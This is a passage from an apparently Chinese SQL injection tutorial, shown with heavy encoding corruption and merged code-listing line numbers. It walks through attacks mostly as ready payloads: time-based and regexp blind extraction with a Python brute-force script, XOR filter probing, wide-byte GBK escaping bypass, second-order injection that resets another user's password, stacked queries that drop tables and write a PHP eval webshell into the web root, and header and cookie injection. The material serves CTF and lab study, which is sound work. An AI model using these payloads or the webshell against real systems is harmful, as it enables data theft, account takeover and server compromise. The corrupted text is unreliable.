å›æ˜¾ï¼Œä¹Ÿæ²¡æœ‰è¾“å‡º SQL è¯­å¥æ‰§è¡Œé”™è¯¯ä¿¡æ¯ã€‚æ­£ç¡®çš„ SQL è¯­å¥å’Œé”™è¯¯çš„ SQL è¯­å¥è¿”å›é¡µé¢éƒ½ä¸€æ ·ï¼Œå¯è€ƒè™‘å»¶æ—¶æ³¨å…¥ã€‚```bash?id=1&#x27; and sleep(3)--+ æŸ¥åº“ 1234?id=1&#x27; and if(length(database())=a,sleep(3),1)--+# çˆ†ç ´æ•°å­— a?id=1&#x27; and if(ascii(substr(database(),a,1))=b,sleep(3),1)--+# åŒæ—¶çˆ†ç ´ æ•°å­— a å’Œ ascii å€¼ b æŸ¥è¡¨ 12?id=1&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),a,1))=b,sleep(3),1)--+# åŒæ—¶çˆ†ç ´ æ•°å­— a å’Œ ascii å€¼ b æŸ¥åˆ— 12?id=1&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),a,1))=b,sleep(3),1)--+# åŒæ—¶çˆ†ç ´ æ•°å­— a å’Œ ascii å€¼ b æŸ¥å­—æ®µ 123?id=1&#x27; and if(ascii(substr((select group_concat(username) from security.users),a,1))=b,sleep(3),1)--+?id=1&#x27; and if(ascii(substr((select group_concat(password) from security.users),a,1))=b,sleep(3),1)--+# åŒæ—¶çˆ†ç ´ æ•°å­— a å’Œ ascii å€¼ b 8.2 è„šæœ¬1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889```## ä¹ã€regexp æ­£åˆ™åŒ¹é…æµ‹è¯•```bashmysql&gt; select * from users where username regexp &#x27;b$&#x27;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.03 sec)mysql&gt; select * from users where username regexp &#x27;d&#x27;;+----+----------+-----------+| id | username | password |+----+----------+-----------+| 1 | Dumb | Dumb || 3 | Dummy | p@ssword || 5 | stupid | stupidity || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+-----------+9 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;^a&#x27;;+----+----------+------------+| id | username | password |+----+----------+------------+| 2 | Angelina | I-kill-you || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 |+----+----------+------------+6 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;admin[0-9]&#x27;;+----+----------+----------+| id | username | password |+----+----------+----------+| 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 14 | admin4 | admin4 |+----+----------+----------+4 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;.n&#x27;; #.åŒ¹é…ä»»æ„å­—ç¬¦+----+----------+------------+| id | username | password |+----+----------+------------+| 2 | Angelina | I-kill-you || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+9 rows in set (0.00 sec)mysql&gt; select * from users where username regexp &#x27;a|b&#x27;; #å«æœ‰ a æˆ– b çš„+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 |+----+----------+------------+10 rows in set (0.00 sec) 9.1 æ‰‹åŠ¨12?id=1&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),a,1)regexp(&#x27;b&#x27;),1,2)=&#x27;1# åŒæ—¶çˆ†ç ´ æ•°å­— a å’Œ å­—æ¯ b 9.2 è„šæœ¬123456789101112131415161718192021222324import requestsimport stringurl = &quot;http://xxxxx&quot;flagstr=&quot; _&#123;&#125;-&quot; + string.ascii_lowercase + string.digitsflag = &#x27;&#x27;for i in range(1,45): for j in flagstr: #payload = f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot; #payload = f&quot;admin&#x27; and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot; payload = f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;i&#125;,1)regexp(&#x27;&#123;j&#125;&#x27;),1,2)=&#x27;1&quot; data = &#123; &#x27;username&#x27;: payload, &#x27;password&#x27;: &#x27;1&#x27; &#125; r = requests.post(url, data=data) if &quot;å¯†ç é”™è¯¯&quot; == r.json()[&#x27;msg&#x27;]: flag += j print(flag) if &quot;&#125;&quot; == j: exit(0) break åã€å¼‚æˆ–æ³¨å…¥å¼‚æˆ–ï¼šä¸€ç§é€»è¾‘è¿ç®—ï¼Œç®€è¨€ä¹‹ï¼Œç›¸åŒä¸ºå‡ï¼Œä¸åŒä¸ºçœŸï¼ŒNULL ä¸ä»»ä½•æ¡ä»¶æ¬²ç«ç»“æœéƒ½ä¸º NULLï¼Œmysql ä¸­çš„ç¬¦å·æ˜¯ ^ å’Œ xorã€‚ æµ‹è¯•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647mysql&gt; select 1=1 ^ 1=1 as res;+-----+| res |+-----+| 0 |+-----+1 row in set (0.00 sec)mysql&gt; select 1=1 xor 1=2 as res;+-----+| res |+-----+| 1 |+-----+1 row in set (0.00 sec)mysql&gt; select 1=2 xor 1=2 as res;+-----+| res |+-----+| 0 |+-----+1 row in set (0.00 sec)mysql&gt; select null xor 1=2 as res;+------+| res |+------+| NULL |+------+1 row in set (0.00 sec)mysql&gt; select null xor 1=1 as res;+------+| res |+------+| NULL |+------+1 row in set (0.00 sec)mysql&gt; select null xor null as res;+------+| res |+------+| NULL |+------+1 row in set (0.00 sec) å¸¸ç”¨æ‰‹æ®µï¼šç”¨äºåˆ¤æ–­ æ‰€è¿‡æ»¤çš„å­—ç¬¦ä¸² 1234?id=1&#x27;^(0)## å¾—åˆ°æ­£å¸¸çš„å›æ˜¾é¡µé¢ï¼Œç”±äºå¼‚æˆ–ä¹‹åå¾—åˆ° çœŸ?id=1&#x27;^(1)## å¾—åˆ°é”™è¯¯çš„å›æ˜¾é¡µé¢ï¼Œç”±äºå¼‚æˆ–ä¹‹åå¾—åˆ° å‡ å¸¸å¸¸ç”¨äºåˆ¤æ–­æˆ‘ä»¬æ‰€æ³¨å…¥çš„æŸäº›å­—æ®µæ˜¯å¦è¢«è¿‡æ»¤ 1?id=1&#x27;^(length(&#x27;union&#x27;)&gt;0)# å¦‚æœ union å·²è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆå¾—åˆ°çš„å°†ä¼šæ˜¯ length(0&gt;0) ï¼Œæ˜¾ç„¶æ˜¯ä¸æˆç«‹çš„ï¼Œé‚£å°±å°†ä¼šæ˜¯ 1&#39;^0 ï¼Œå¾—åˆ°çš„ä¸º çœŸï¼Œæ‰€ä»¥å°†ä¼šè¿”å› æ­£å¸¸ çš„é¡µé¢ï¼› å¦‚æœ union æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç›¸åçš„ï¼Œå°†ä¼šå¾—åˆ°ä¸ºå‡çš„å¼‚æˆ–ï¼Œè¿”å›çš„å°†ä¼šæ˜¯ é”™è¯¯ çš„é¡µé¢ã€‚ ç”±æ­¤å¯ä»¥åˆ¤æ–­æŸäº›å­—ç¬¦çš„è¿‡æ»¤æƒ…å†µã€‚ å¸¸å¸¸ä½¿ç”¨ï¼š 123?id=1&#x27;^(length(&#x27;select&#x27;)&gt;0)#?id=1&#x27;^(length(&#x27;and&#x27;)&gt;0)#?id=1&#x27;^(length(&#x27;or&#x27;)&gt;0)# ç¬¦å·ç‰¹ç‚¹ï¼š ^ è¿ç®—ç¬¦ä¼šåšä½å¼‚æˆ–è¿ç®— xor åšé€»è¾‘è¿ç®— 1 xor 0 ä¼šè¾“å‡º 1 ï¼Œå…¶å®ƒæƒ…å†µè¾“å‡ºå…¶ä½™æ‰€æœ‰æ•°æ® åä¸€ã€å®½å­—èŠ‚æ³¨å…¥é˜²å¾¡åŸç†ä¸ºäº†é˜²æ­¢ SQLæ³¨å…¥æ¼æ´ï¼Œé€šå¸¸åœ¨æºä»£ç å½“ä¸­ä¼šå¯¹æˆ‘ä»¬æ‰€è¾“å…¥çš„ SQLæŸ¥è¯¢è¯­å¥è¿›è¡Œä¸€ä¸ª è½¬ä¹‰ ï¼Œä¸€èˆ¬æ˜¯å¯¹ å•å¼•å·ï¼ŒåŒå¼•å· è¿›è¡Œä¸€ä¸ªè½¬ä¹‰å˜æˆ &#39; æˆ–è€…æ˜¯&quot;ï¼Œè¿™æ ·Mysqlåœ¨ æ‰§è¡Œ SQLè¯­å¥æ—¶ï¼Œä¸ä¼šå½±å“åˆ°æŸ¥è¯¢ï¼Œå³ä¸ä¼šå‡ºç°æŠ¥é”™ï¼Œæ•°æ®å­˜å‚¨åœ¨æ•°æ®åº“å½“ä¸­æ—¶ä¸ä¼šå«æœ‰ \\ ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä»…ä»…æ˜¯åœ¨æ‰§è¡Œ SQLè¯­å¥æ—¶è¿›è¡Œäº†è½¬ä¹‰ï¼Œå½“æˆ‘ä»¬ä»æ•°æ®åº“ä¸­å‘å¤–è°ƒå‡ºæ•°æ®æ—¶å¹¶ä¸ä¼šå«æœ‰ \\ ï¼Œä¹Ÿå°±é¢„é˜²äº† SQLæ³¨å…¥ã€‚ å¦‚æœæˆ‘ä»¬ä¸è¿›è¡Œè½¬ä¹‰ï¼ŒæŒ‰ç…§ä¸€èˆ¬ æ”»å‡»è€…çš„æ€è·¯è¿›è¡Œ SQLæ³¨å…¥ï¼Œéƒ½æ˜¯é€šè¿‡ ?id=1â€™ è¿›è¡ŒéªŒè¯ï¼Œå¦‚ä¸‹å›¾ï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œä»»ä½•é˜²å¾¡ï¼Œå³æ²¡æœ‰è¿›è¡Œè½¬ä¹‰æ“ä½œï¼Œå°±ä¼šå‡ºç°æŠ¥é”™ï¼Œä¹Ÿå°±å¾ˆå®¹æ˜“çš„éªŒè¯å‡ºæ¥äº† çš„ç¡®å­˜åœ¨ SQLæ³¨å…¥ï¼Œå¹¶ä¸”å®¹æ˜“çœ‹åˆ°æ³¨å…¥æ–¹å¼ã€‚ å¸¸ä½¿ç”¨çš„ è½¬ä¹‰å‡½æ•°ï¼š 1234567891011121314151617addslashes() å‡½æ•°è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸² å•å¼•å·ï¼ˆ&#x27;ï¼‰ åŒå¼•å·ï¼ˆ&quot;ï¼‰ åæ–œæ ï¼ˆ\\ï¼‰ NULL mysql_real_escape_string() å‡½æ•°: è½¬ä¹‰ SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š \\x00 \\n \\r \\ &#x27; &quot; \\x1a addslashes() è§£å†³ï¼š ç½‘é¡µè¿æ¥æ•°æ®åº“æ—¶ï¼Œå°†å­—ç¬¦ç¼–ç è®¾ç½®ä¸º GBK ç¼–ç é›†åˆï¼Œç„¶åè¿›è¡Œ SQLè¯­å¥çš„æ‹¼æ¥ï¼Œè¿›è¡Œæ•°æ®åº“çš„æŸ¥è¯¢ã€‚ GBKç¼–ç é‡‡ç”¨ åŒå­—èŠ‚ç¼–ç ï¼Œç¼–ç èŒƒå›´ä¸º 8140~FEFE è½¬ä¹‰å­—ç¬¦ \\ çš„ç¼–ç æ˜¯ 5c ï¼Œå…¶åœ¨ GBKçš„ç¼–ç èŒƒå›´ä¹‹å†…ï¼Œå¦‚æœæˆ‘ä»¬åœ¨è½¬ä¹‰å­—ç¬¦ä¹‹å‰ æäº¤ä¸€ä¸ªåŒæ ·åœ¨ç¼–ç èŒƒå›´ä¹‹å†…çš„å­—ç¬¦ï¼Œç½‘é¡µåœ¨è§£ææ—¶ï¼Œå°±ä¼šå°†å…¶ä¸ åé¢çš„è½¬ä¹‰å­—ç¬¦è¿›è¡Œä¸€ä¸ªåŒ¹é…ï¼Œç»„æˆä¸€ä¸ª åŒå­—èŠ‚çš„ GBKç¼–ç çš„æ±‰å­—ï¼Œä»è€Œå¤±å»äº†è½¬ä¹‰çš„ä½œç”¨ã€‚ å¸¸ç”¨æ–¹æ³•ï¼šåœ¨ä½¿ç”¨å•å¼•å· æˆ–è€… åŒå¼•å·ä¹‹å‰æ·»åŠ  %df å­—ç¬¦ æ–¹æ³•äºŒï¼šåœ¨ä½¿ç”¨å•å¼•å· æˆ–è€… åŒå¼•å·ä¹‹å‰æ·»åŠ  %aa%5c å­—ç¬¦ è§£é‡Šï¼š 123456ä¾‹å¦‚: ?id=1%aa%5c&#x27; å…¶å®æ˜¯ï¼š ?id=1%aa\\&#x27; å³ï¼š ?id=1%aa%\\\\\\&#x27;å…¶ä¸­ \\ æ˜¯ %5c; &#x27; æ˜¯ %27æ•°æ®åº“ä¸­åšäº†è½¬ä¹‰å¤„ç†ä¹‹åå˜æˆï¼š%aa%5c%5c%5c%27è¿™æ ·ï¼Œ%aaå’Œ%5cè¿›è¡Œç»„åˆç§°ä¸ºäº†ä¸€ä¸ªæ±‰å­—ï¼Œ%5cä¸%5cä»æ—§æ˜¯ \\\\ ï¼Œè€Œ %27(å•å¼•å·) å°±åˆ†ç¦»å‡ºæ¥äº† GBKç¼–ç èŒƒå›´ åäºŒã€äºŒæ¬¡æ³¨å…¥æ ¹æºåœ¨äºï¼šæ¥å‘è¿™ä¿¡ä»»ä»æ•°æ®åº“ä¸­å–å‡ºçš„æ•°æ®éƒ½æ˜¯æ— å®³çš„ã€‚ åŸç†ï¼šæ”»å‡»è€…æ„é€ çš„æ¶æ„æ•°æ® å­˜å‚¨åœ¨ æ•°æ®åº“ åï¼Œæ¶æ„æ•°æ® è¢«è¯»å– å¹¶è¿›å…¥åˆ° SQLæŸ¥è¯¢è¯­å¥ æ‰€å¯¼è‡´çš„æ³¨å…¥ã€‚é˜²å¾¡è€…å¯èƒ½åœ¨ç”¨æˆ· è¾“å…¥ æ¶æ„æ•°æ®æ—¶å¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº† è½¬ä¹‰å¤„ç† ï¼Œä½†åœ¨æ¶æ„æ•°æ®æ’å…¥åˆ°æ•°æ®åº“æ—¶è¢«å¤„ç†çš„æ•°æ®åˆ è¢«è¿˜åŸ å¹¶å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œå½“Webç¨‹åº è°ƒç”¨ å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¶æ„æ•°æ®å¹¶æ‰§è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œå°±å‘ç”Ÿäº†SQLäºŒæ¬¡æ³¨å…¥ã€‚ä¹Ÿå°±æ˜¯è¯´åœ¨åº”ç”¨ç¨‹åºä¸­è¾“å…¥æ¶æ„é€ çš„æ•°æ®åº“æŸ¥è¯¢è¯­å¥æ—¶ä¼šè¢«è½¬ä¹‰ï¼Œä½†æ˜¯åœ¨æ•°æ®åº“å†…éƒ¨è°ƒç”¨è¯»å–è¯­å¥çš„æ—¶å€™åˆè¢«è¿˜åŸã€‚ äºŒæ¬¡æ³¨å…¥æ­¥éª¤:ç¬¬ä¸€æ­¥ï¼šæ’å…¥æ¶æ„æ•°æ®è¿›è¡Œæ•°æ®åº“æ’å…¥æ•°æ®æ—¶ï¼Œå¯¹å…¶ä¸­çš„ç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº† è½¬ä¹‰å¤„ç†ï¼Œåœ¨å†™å…¥æ•°æ®åº“çš„æ—¶å€™åˆä¿ç•™äº†åŸæ¥çš„æ•°æ®ã€‚ç¬¬äºŒæ­¥ï¼šå¼•ç”¨æ¶æ„æ•°æ®å¼€å‘è€…é»˜è®¤å­˜å…¥æ•°æ®åº“çš„æ•°æ®éƒ½æ˜¯å®‰å…¨çš„ï¼Œåœ¨è¿›è¡ŒæŸ¥è¯¢å³è°ƒç”¨å·²å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ•°æ®æ—¶ï¼Œç›´æ¥ä»æ•°æ®åº“ä¸­å–å‡ºæ¶æ„æ•°æ®ï¼Œæ²¡æœ‰è¿›è¡Œè¿›ä¸€æ­¥çš„æ£€éªŒçš„å¤„ç†ã€‚ ä¸€èˆ¬ç»“åˆ ä¿®æ”¹å¯†ç  åŠŸèƒ½ç‚¹ è¿›è¡Œåˆ©ç”¨ ä¸¾ä¾‹ï¼š å·²çŸ¥ç”¨æˆ·ç™»é™†æ—¶çš„æŸ¥è¯¢ login.php 1234æŸ¥è¯¢é˜²å¾¡ï¼šlogin.php$username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);$password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);$sql = &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;; æˆ‘ä»¬ä½¿ç”¨ä¸‹é¢ ç”¨æˆ·ç™»å½• 12Dumb&#x27;Dumb åˆ™å®é™…è¿›è¡Œæ“ä½œçš„è¯­å¥æˆä¸º 1SELECT * FROM users WHERE username=&#x27;Dumb\\&#x27;&#x27; and password=&#x27;Dumb&#x27; ç”±äºè¿›è¡Œäº† mysql_real_escape_string è½¬ä¹‰ï¼Œåˆ™ä¸ä¼šå¼•å‘ sql æ³¨å…¥ï¼Œä»è€ŒæˆåŠŸè¿›è¡Œäº†é˜²å¾¡ å·²çŸ¥æ³¨å†Œç”¨æˆ·æ—¶çš„æ’å…¥ login_create.php 12345æ’å…¥é˜²å¾¡ï¼šlogin_create.php$username= mysql_escape_string($_POST[&#x27;username&#x27;]) ;$pass= mysql_escape_string($_POST[&#x27;password&#x27;]);$re_pass= mysql_escape_string($_POST[&#x27;re_password&#x27;]);$sql = &quot;insert into users ( username, password) values(\\&quot;$username\\&quot;, \\&quot;$pass\\&quot;)&quot;; æˆ‘ä»¬ æ³¨å†Œæ–°çš„ç”¨æˆ· 123Dumb&#x27;#123456123456 åŒæ ·å¯¹æˆ‘ä»¬è¾“å…¥çš„æ•°æ®è¿›è¡Œäº†è½¬ä¹‰å¤„ç†ï¼Œåˆ™å®é™…æ“ä½œè¯­å¥æ˜¯ 12username è¿›è¡Œè½¬ä¹‰å¤„ç†ä¹‹åå¾—åˆ° Dumb\\&#x27;#ï¼Œä»£å…¥ï¼Œå³insert into users ( username, password) values(\\&quot;Dumb\\&#x27;#\\&quot;, \\&quot;123456\\&quot;) è¿™æ ·æˆ‘ä»¬æˆåŠŸæ³¨å†Œäº†ä¸€ä¸ªæ–°çš„ç”¨æˆ· 12Dumb&#x27;#123456 å·²çŸ¥ç”¨æˆ·ä¿®æ”¹å¯†ç  pass_change.php 12345$username= $_SESSION[&quot;username&quot;];$curr_pass= mysql_real_escape_string($_POST[&#x27;current_password&#x27;]);$pass= mysql_real_escape_string($_POST[&#x27;password&#x27;]);$re_pass= mysql_real_escape_string($_POST[&#x27;re_password&#x27;]);$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; å¯ä»¥çœ‹åˆ°ï¼Œæ­¤æ—¶çš„ç”¨æˆ·åæ²¡æœ‰è¿›è¡Œè½¬ä¹‰é˜²å¾¡å°±å‡ºç°åœ¨äº†sqlè¯­å¥å½“ä¸­ æˆ‘ä»¬ä»¥æ–°æ³¨å†Œçš„ Dumb&#39;# ç”¨æˆ·ç™»å½•è¿›å»ï¼Œåˆ©ç”¨ä¿®æ”¹å¯†ç çš„åŠŸèƒ½ 123Dumb&#x27;#654321654321 ä»£å…¥ sql è¯­å¥ä¸­å¾—åˆ° 1UPDATE users SET PASSWORD=&#x27;654321&#x27; where username=&#x27;Dumb&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; è¿™æ ·çœ‹æ¥ï¼Œæˆ‘ä»¬å®é™…ä¸Šä¿®æ”¹çš„æ˜¯ ç”¨æˆ·åä¸º Dumb çš„å¯†ç  è¿™æ ·æˆ‘ä»¬å°±åœ¨åªä»¥çŸ¥æŸä¸€ç”¨æˆ·åï¼Œä¸çŸ¥å…¶å¯†ç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ äºŒæ¬¡æ³¨å…¥ ï¼ŒæˆåŠŸçš„å¯ä»¥ç™»å½•å…¶å®ƒç”¨æˆ·çš„è´¦å·äº† åä¸‰ã€å †å æ³¨å…¥SQLè¯­å¥ä¹¦å†™æ—¶ï¼Œä»¥ åˆ†å· ; è¡¨ç¤ºä¸€æ¡SQLè¯­å¥ç»“æŸï¼Œé€šè¿‡ä½¿ç”¨åˆ†å·åŒæ—¶æ‰§è¡Œå¤šæ¡ SQLè¯­å¥ å³ä¸º å †å æ³¨å…¥ ã€‚è¯¥æ³¨å…¥å¯ä¿®æ”¹æ•°æ®åº“çš„ä»»æ„ç»“æ„å’Œæ•°æ®ã€‚ æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142mysql&gt; select * from users where id= 1;create table qwe like users;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)Query OK, 0 rows affected (0.04 sec)mysql&gt; show tables;+--------------------+| Tables_in_security |+--------------------+| emails || qwe || referers || uagents || users |+--------------------+5 rows in set (0.00 sec)mysql&gt; select * from users where id= 1;drop table qwe;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)Query OK, 0 rows affected (0.01 sec)mysql&gt; show tables;+--------------------+| Tables_in_security |+--------------------+| emails || referers || uagents || users |+--------------------+4 rows in set (0.00 sec) å †å æ³¨å…¥å†™ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ 1a&#x27;;select &#x27;&lt;?php @eval($_POST[111]); ?&gt;&#x27; into outfile &#x27;/var/www/html/hacker.php&#x27;;--+ é¢˜ä¾‹ï¼š[GYCTF2020]Blacklist1 123456781&#x27; order by 2#1&#x27;;show databases;#1&#x27;;select database();#1&#x27;;show tables;1&#x27;;show columns from è¡¨å;#1&#x27;create table æ–°è¡¨å like å·²çŸ¥è¡¨å;#1&#x27;;drop table æ–°è¡¨å;#1&#x27;;handler è¡¨å open;handler è¡¨å read first;# åå››ã€HTTP å¤´éƒ¨æ³¨å…¥14.1 User-Agent æ³¨å…¥æºç ï¼š 123$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; å½“å°† å®¢æˆ·ç«¯å¯æ§çš„ $uagent å¸¦å…¥ä»£å…¥ $insert sql è¯­å¥æ—¶ï¼Œå¿…é¡»å°†ç´§éšå…¶åçš„ å•å¼•å·å…ˆé—­åˆ æŠ“åŒ…ï¼Œä¿®æ”¹ User-Agent å€¼ 1234User-Agent:a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1# è¿™æ ·ä»£è¿›å»å³ä¸º$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;$IP&#x27;, $uname)&quot;; 14.2 Referer æ³¨å…¥æºç ï¼š 123$uagent = $_SERVER[&#x27;HTTP_REFERER&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;; åŒæ ·çš„é“ç†ï¼šå½“å°† å®¢æˆ·ç«¯å¯æ§çš„ $uagent å¸¦å…¥ä»£å…¥ $insert sql è¯­å¥æ—¶ï¼Œå¿…é¡»å°†ç´§éšå…¶åçš„ å•å¼•å·å…ˆé—­åˆ æŠ“åŒ…ï¼Œä¿®æ”¹ Referer å€¼ 1234Referer:a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1# è¿™æ ·ä»£è¿›å»å³ä¸º$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;a&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1&#x27;, &#x27;$IP&#x27;)&quot;; 14.3 Cookie æ³¨å…¥å¦‚ä»Šç»å¤§éƒ¨é—¨å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­ä¼šå¯¹ç”¨æˆ·ä¼ å…¥çš„å‚æ•°è¿›è¡Œé€‚å½“çš„è¿‡æ»¤ï¼Œä½†æ˜¯å¾ˆå¤šæ—¶å€™ï¼Œç”±äºä¸ªäººå¯¹å®‰å…¨æŠ€æœ¯äº†è§£çš„ä¸åŒï¼Œæœ‰äº›å¼€å‘äººå‘˜åªä¼šå¯¹getï¼Œpostè¿™ç§æ–¹å¼æäº¤çš„æ•°æ®è¿›è¡Œå‚æ•°è¿‡æ»¤ã€‚ ä½†æˆ‘ä»¬çŸ¥é“ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œæäº¤æ•°æ®å¹¶éä»…ä»…åªæœ‰get / postè¿™ä¸¤ç§æ–¹å¼ï¼Œè¿˜æœ‰ä¸€ç§ç»å¸¸è¢«ç”¨åˆ°çš„æ–¹å¼ï¼šrequest(â€œxxxâ€),å³requestæ–¹æ³•ã€‚é€šè¿‡è¿™ç§æ–¹æ³•ä¸€æ ·å¯ä»¥ä»ç”¨æˆ·æäº¤çš„å‚æ•°ä¸­è·å–å‚æ•°å€¼ã€‚ è¿™å°±é€ æˆäº†cookieæ³¨å…¥çš„æœ€åŸºæœ¬æ¡ä»¶ï¼šä½¿ç”¨äº†requestæ–¹æ³•ï¼Œä½†æ˜¯åªå¯¹ç”¨æˆ·get / postæäº¤çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ã€‚ ä¾‹å¦‚ï¼šwww.xx.com/search.asp?id=1 è®¿é—®ï¼šwww.xx.com/srarch.asp å‘ç°ä¸èƒ½è®¿é—®ï¼Œè¯´ç¼ºå°‘idå‚æ•°ã€‚ æˆ‘ä»¬è¯•ç€å°†id=1æ”¾åœ¨cookieä¸­å†æ¬¡è®¿é—®ï¼ŒæŸ¥çœ‹èƒ½å¦è®¿é—®ï¼Œå¦‚æœèƒ½è®¿é—®ï¼Œåˆ™è¯´æ˜idå‚æ•°å¯ä»¥é€šè¿‡cookieæäº¤ã€‚ é‚£ä¹ˆï¼Œå¦‚æœåç«¯æ²¡æœ‰å¯¹cookieä¸­ä¼ å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆï¼Œè¿™ä¸ªç½‘ç«™å°±æœ‰å¯èƒ½å­˜åœ¨cookieæ³¨å…¥äº†ï¼ 123$cookee = $username;$cookee = $_COOKIE[&#x27;uname&#x27;];$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;; åäº”ã€æ— åˆ—åæ³¨å…¥ Mysql ç‰ˆæœ¬ &gt; 5 æ—¶ï¼Œéƒ½ä¼šå­˜åœ¨ä¸€ä¸ªå…ƒæ•°æ®åº“ information_schema ï¼Œå…¶ä¸­è®°å½•ç€ mysql æ‰€æœ‰åº“ã€ä»¥åŠè¡¨çš„ç»“æ„ï¼Œæˆ‘ä»¬é€šå¸¸çš„ sql æ³¨å…¥æ‰‹æ®µå³æ˜¯é€šè¿‡è¯¥å…ƒæ•°æ®åº“æ¥è·å–åˆ°å…¶å®ƒåº“ä»¥åŠè¡¨çš„ä¿¡æ¯ã€‚é‚£å¦‚æœè¿™ä¸ª information_schema è¢«è¿‡æ»¤æ‰äº†è¯¥æ€ä¹ˆåŠï¼Ÿ 15.1 ä½¿ç”¨åˆ«çš„å…·æœ‰ç±»ä¼¼åŠŸèƒ½çš„åº“é™¤äº† information_schema ä¸­å­˜åœ¨ tables schemata columns ç­‰è¡¨çš„ä¿¡æ¯å¤–ï¼Œåœ¨é«˜ç‰ˆæœ¬å½“ä¸­è¿˜å­˜åœ¨ INNODB_TABLES INNODS_COLUMNS ä¸­ä¹Ÿè®°å½•ç€è¡¨çš„ç»“æ„ã€‚ 15.1.1 sys æ•°æ®åº“ åˆ©ç”¨mysql5.7æ–°å¢çš„ sys.schema_auto_increment_columns åŸºç¡€æ•°æ®æ¥è‡ªä¸information_schema,ä»–çš„ä½œç”¨æ˜¯å¯¹è¡¨çš„è‡ªå¢IDè¿›è¡Œç›‘æ§ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŸå¼ 